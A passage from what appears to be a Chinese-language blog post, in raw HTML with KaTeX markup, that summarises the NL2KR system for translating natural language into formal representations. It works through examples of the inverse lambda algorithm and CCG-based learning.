href=\"188-222\">1</a>](<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuanN0b3Iub3JnL3N0YWJsZS8yNDQzNTQyNA==\">https://www.jstor.org/stable/24435424</span>)，其中单词的翻译通过 lambda 演算公式给出，句子和短语的含义是由组成词的意义组合而成。</p>\n<p>该方法的主要挑战是为每个单词提出适当的 lambda 演算表达式：</p>\n<ol>\n<li>单词数量可能很大</li>\n<li>单词的 lambda 表达式对人来说过于复杂</li>\n<li>lambda 对单词的表达是特定于目标语言的</li>\n</ol>\n<p>为了解决上述挑战，可以使用逆 lambda 算法<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcnhpdi5vcmcvYWJzLzExMDguMzg0Mw==\"> [2]</span>，该算法计算单词 / 短语 G 的含义，当单词 / 短语 H 和短语 GH（HG）的含义已知时。</p>\n<p>NL2KR 系统使用包含一些单词及其含义的初始词典 和 一组包含自然语言句子及其翻译的训练语料库 来 学习单词的新含义。然后系统使用新学习的词典来翻译新句子。</p>\n<p>本文中，作者将概述 NL2KR 系统及其使用示例。</p>\n<p><strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWhhbnMvJUNFJTlCJUU2JUJDJTk0JUU3JUFFJTk3Iw==\">λ 演算</span></strong></p>\n<h5 id=\"2using-inverse-λ-and-generalization-to-translate-english-to-formal-languages\"><a class=\"markdownIt-Anchor\" href=\"#2using-inverse-λ-and-generalization-to-translate-english-to-formal-languages\">#</a> [2]Using Inverse λ and Generalization to Translate English to Formal Languages</h5>\n<p>我们提出了一个将自然语言句子翻译为形式或知识表示语言的公式的系统。我们的系统使用两个逆 λ 演算运算符，使用它们可以将某些单词、短语和句子的语义表示作为输入，并从中导出其他单词和短语的语义表示。我们的逆 λ 运算符适用于许多形式语言，包括一阶逻辑、数据库查询语言和回答集编程（ASP）。我们的系统使用句法组合分类解析器来解析自然语言句子，并按照解析的指导构建句子的语义。两者使用相同的解析器。除了逆 λ 演算运算符之外，我们的系统还使用泛化概念从同一类别的其他单词的语义表示中学习单词的语义表示。与此同时，我们使用现有的统计学习方法来分配权重来处理单词的多重含义。我们的系统在机器人命令和控制以及数据库查询的自然语言界面的标准语料库上产生了改进的结果。</p>\n<p>G = λx.H(in(river, Texas) : x@Texas@river)     \t\t\tF = λv1, <span class=\"exturl\" data-url=\"aHR0cDovL3YyLmlu\">v2.in</span>(v2, v1)</p>\n<p>G@F = H(in(river, Texas) : F@Texas@river)= H(in(river, Texas) : λv1, <span class=\"exturl\" data-url=\"aHR0cDovL3YyLmlu\">v2.in</span>(v2, v1) @Texas@river)</p>\n<p>​\t\t =H(in(river, Texas) : λv1, <span class=\"exturl\" data-url=\"aHR0cDovL3YyLmlu\">v2.in</span>(v2, v1) @Texas@river)= H(in(river, Texas) : in(river, Texas)) = H(in(river, Texas))</p>\n<h3 id=\"overview\"><a class=\"markdownIt-Anchor\" href=\"#overview\">#</a> Overview</h3>\n<p><img data-src=\"image-20231030145418978.png\" alt=\"image-20231030145418978\"></p>\n<p>上图为 NL2KR 系统的架构，左边是用于翻译的 NL2KR-T，右边是用于学习的 NL2KR-L。</p>\n<p>用于学习的部分，采用初始字典（lambda 演算表达式）、一组训练句子及其目标形式表示作为输入。然后使用组合分类语法（CCG）解析器来构建解析树。随后，系统使用 逆 lambda 和 泛化算法（Generalization）来学习新遇到的，不在初始字典中的新单词的含义，并将它们添加到词典中。然后使用参数学习方法来估计每个词典条目（单词、其句法类别和含义）的权重，使得训练集中的句子被翻译成给定的形式的联合概率最大。NL2KR-L 的结果是最终的词典，其中包含更大的单词集、它们的含义和权重。</p>\n<p>训练组件完成其工作后，翻译子部分 (NL2KR-T) 使用此更新的词典并使用 CCG 解析器翻译句子。由于单词可以具有多种含义及其相关的 λ 演算表达式，因此分配给词典中每个词汇条目的权重有助于确定单词在句子上下文中更可能的含义。</p>\n<h3 id=\"conclusion-and-future-work\"><a class=\"markdownIt-Anchor\" href=\"#conclusion-and-future-work\">#</a> Conclusion and Future Work</h3>\n<p>在这项工作中，我们提出了 NL2KR 系统，该系统用于将自然语言翻译为形式表示。 NL2KR 系统的输入是训练句子及其形式化表示；以及一些已知单词含义的初始词典。 NL2KR 系统将尝试从训练数据中学习其他单词的含义。我们提供了六个脚本来执行 NL2KR 的多个模块，并通过示例展示了如何使用它们。</p>\n<p>未来，我们计划使 NL2KR 更具可扩展性，并向 NL2KR 系统添加更多功能，例如（1）自动构建初始词典和（2）使用更多知识（例如词义）来选择单词的正确含义。</p>\n<h3 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h3>\n<p>NL2KR 是一个半自动语义解析平台，它有两个相互依赖的子部分：（1）用于学习的 NL2KR-L；（2）用于翻译的 NL2KR-T。</p>\n<p>NL2KR-L 输入的初始词典包括一些单词及其在 lambda-calculus 表达式中的含义、一组训练句子及其目标形式表示。然后，它使用组合分类语法（CCG）解析器构建解析树。接下来，系统的学习子部分使用逆 -λ 算法和泛化算法来学习新遇到的词的含义，并将其添加到词库中。然后使用参数学习法来估计每个词库条目（词、其句法类别和含义）的权重，从而使训练集中的句子被翻译成其给定形式表示的联合概率最大化。</p>\n<p>NL2KR-L 的结果就是最终词库，其中包含所有词、词义和权重。训练组件完成工作后，翻译组件（NL2KR-T）将使用更新后的词典，并使用 CCG 分析器翻译句子。由于单词可以有多种含义及其相关的 λ 微积分表达式，分配给词典中每个词条的权重有助于确定单词在句子上下文中更可能的含义。</p>\n<h3 id=\"why\"><a class=\"markdownIt-Anchor\" href=\"#why\">#</a> Why</h3>\n<p>将自然语言表示成知识表示语言的方法有许多，作者是在 Montague 的基础上开展研究，自然语言中的单词处理是通过 lambda 演算公式给出的，短语和句子的含义是通过组合单词语义获得。然而这样操作的挑战在于需要对每一个单词提出适当的 lambda 演算表达式：首先，单词的数量繁多；其次，某些单词的 lambda 表达式过于复杂，不容易直接想出；最后，lambda 表达式是特定于目标语言的。</p>\n<h3 id=\"what\"><a class=\"markdownIt-Anchor\" href=\"#what\">#</a> What</h3>\n<p>为了解决上述问题，作者采用 逆 lambda 算法，已知 单词 / 短语 H 和短语 GH，就可以求出，单词 / 短语的含义 G。</p>\n<p>NL2KR 系统有两个子系统，使用包含一些单词及其含义的初始词典和一组包含自然语言句子及其翻译的训练语料库来学习单词的新含义。</p>\n<h3 id=\"how-nl2kr系统\"><a class=\"markdownIt-Anchor\" href=\"#how-nl2kr系统\">#</a> How NL2KR 系统</h3>\n<p><img data-src=\"image-20231030145418978.png\" alt=\"image-20231030145418978\"></p>\n<p>NL2KR-L 是学习部分，输入是初始词典、训练语料库、语法。首先将 训练语料库按照语法通过 CCG 组合分类语法解析器构造解析树；随后，通过 逆 lambda 算法和 泛化方法 来学习不存在于初始词典中的新单词的含义，并将其添加到词典中；然后，使用参数学习（parameter learning）的方法估计词典中条目的权重，使得训练集中的句子被翻译成给定形式的联合概率最大。最终输出更大的词典。</p>\n<p>NL2KR-T 是翻译部分，其使用训练产生的词典作为输入，通过使用 CCG 解析器解析句子。</p>\n<h3 id=\"实验过程\"><a class=\"markdownIt-Anchor\" href=\"#实验过程\">#</a> 实验过程</h3>\n<h4 id=\"lambda-算法\"><a class=\"markdownIt-Anchor\" href=\"#lambda-算法\">#</a> lambda 算法</h4>\n<p>例子：</p>\n<pre><code>function =# y .# x. loves (x , y)\nargument =# x. x@mia\nResult = #x . loves (x ,# x0 . x0 @ mia )\n</code></pre>\n<h4 id=\"逆-lambda-算法\"><a class=\"markdownIt-Anchor\" href=\"#逆-lambda-算法\">#</a> 逆 lambda 算法</h4>\n<p>f = g @ h 或者 f = h@g，但有时我们只有 f 和 g，怎么得到 h</p>\n<p>f = l @ r</p>\n<pre><code>parent =# x. loves (x , mia )\nleft_child = mia\n\nRight child = null\n\n因为 找不到一个 r 使得 l@r = f\n</code></pre>\n<p>但如果：</p>\n<pre><code>parent =# x. loves (x , mia )\nright_child = mia\n\nLeft child = # x1 .# x. loves (x , x1 )\n\n因为 # x1 .# x. loves (x , x1 ) @ mia = # x. loves (x , mia )\n</code></pre>\n<p>对第一个例子，把 mia 换一种形式表示</p>\n<pre><code>parent =# x. loves (x , mia )\nleft_child =# x. x @ mia\n\nRight child = # x1 .# x. loves (x , x1 )\n\n因为 # x. x @ mia @ # x1 .# x. loves (x , x1 ) = # x1 .# x. loves (x , x1 ) @ mia = # x. loves (x , mia )\n</code></pre>\n<h5 id=\"逆-lambda-算法的细节\"><a class=\"markdownIt-Anchor\" href=\"#逆-lambda-算法的细节\">#</a> 逆 lambda 算法的细节</h5>\n<p>逆 lambda 算法包括两个逆 lambda 操作，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><msub><mi>e</mi><mi>L</mi></msub></mrow><annotation encoding=\"application/x-tex\">Inverse_L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">s</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">L</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><msub><mi>e</mi><mi>R</mi></msub></mrow><annotation encoding=\"application/x-tex\">Inverse_R</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">s</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.00773em;\">R</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></p>\n<p>假设有 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi mathvariant=\"normal\">@</mi><mi>F</mi><mo>=</mo><mi>H</mi></mrow><annotation encoding=\"application/x-tex\">G@F=H</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span></span></span></span></p>\n\\begin{align*}\\label{2}\n&1.IF \\; G \\;is\\;\\lambda v.v@J,set\\;F=Inverse_L(H,J)\\\\\n&2.IF\\;J\\;is\\;a\\;sub\\;term\\;of\\;H\\;and\\;G\\;is\\;\\lambda v.H(J:v)\\;then\\;F=J\\\\\n&3.IF\\;G\\;is\\;not\\;\\lambda v.v@J,J\\;is\\;a\\;sub\\;term\\;of\\;H\\;and\\;G\\;is\\;\\lambda w.H(J(J_1,...J_m):w@J_p,...,J_q)with\\\\\n&\\;1≤p,q,s ≤ m. then\\;F = λv1, ..., vs.J(J1, ..., Jm : vp, ..., vq).\n\\end{align*}\n\n<p>例子：</p>\n<p>假设有 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo>=</mo><mi>i</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mi>r</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi><mo separator=\"true\">,</mo><mi>T</mi><mi>e</mi><mi>x</mi><mi>a</mi><mi>s</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H=in(river,Texas)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mclose\">)</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mo>=</mo><mi>λ</mi><mi>v</mi><mi mathvariant=\"normal\">.</mi><mi>v</mi><mi mathvariant=\"normal\">@</mi><mi>T</mi><mi>e</mi><mi>x</mi><mi>a</mi><mi>s</mi><mi mathvariant=\"normal\">@</mi><mi>r</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">G=\\lambda v.v@Texas@river</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">λ</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span></span></span></span></p>\n<p>由于 J 不是条件一中的类型，因为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>J</mi><mo>=</mo><mi>T</mi><mi>e</mi><mi>x</mi><mi>a</mi><mi>s</mi><mi mathvariant=\"normal\">@</mi><mi>r</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">J=T exas@river</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span></span></span></span> 不是一个公式，所以条件一不符合</p>\n<p>并且也不符合条件二。</p>\n<p>因此，我们尝试寻找一个合适的 J 满足条件三。假设 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>J</mi><mn>1</mn></msub><mo>=</mo><mi>r</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi><mo separator=\"true\">,</mo><msub><mi>J</mi><mn>2</mn></msub><mo>=</mo><mi>T</mi><mi>e</mi><mi>x</mi><mi>a</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">J_1=river,J_2=Texas</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.09618em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.09618em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span></span></span></span> 那么第三个条件应该满足</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mo>=</mo><mi>λ</mi><mi>x</mi><mi mathvariant=\"normal\">.</mi><mi>H</mi><mo stretchy=\"false\">(</mo><mi>J</mi><mo stretchy=\"false\">(</mo><msub><mi>J</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>J</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><mo>:</mo><mi>x</mi><mi mathvariant=\"normal\">@</mi><msub><mi>J</mi><mn>2</mn></msub><mi mathvariant=\"normal\">@</mi><msub><mi>J</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">G=\\lambda x.H(J(J_1,J_2):x@J_2@J_1)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">λ</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.09618em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.09618em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mord\">@</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.09618em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">@</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.09618em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span>  即 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>J</mi><mo>=</mo><mi>i</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">)</mo><mo separator=\"true\">,</mo><mtext>  </mtext><mi>G</mi><mo>=</mo><mi>λ</mi><mi>x</mi><mi mathvariant=\"normal\">.</mi><mi>H</mi><mo stretchy=\"false\">(</mo><mi>i</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mi>r</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi><mo separator=\"true\">,</mo><mi>T</mi><mi>e</mi><mi>x</mi><mi>a</mi><mi>s</mi><mo stretchy=\"false\">)</mo><mo>:</mo><mi>x</mi><mi mathvariant=\"normal\">@</mi><mi>T</mi><mi>e</mi><mi>x</mi><mi>a</mi><mi>s</mi><mi mathvariant=\"normal\">@</mi><mi>r</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi><mo stretchy=\"false\">)</mo><mo separator=\"true\">,</mo><mtext>  </mtext><mi>F</mi><mo>=</mo><mi>λ</mi><mi>v</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>v</mi><mn>2.</mn><mi>i</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mi>v</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>v</mi><mn>2</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">J=in(),\\;G=\\lambda x.H(in(river,Texas):x@Texas@river),\\;F=\\lambda v1,v2.in(v1,v2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span><span class=\"mclose\">)</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">λ</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span 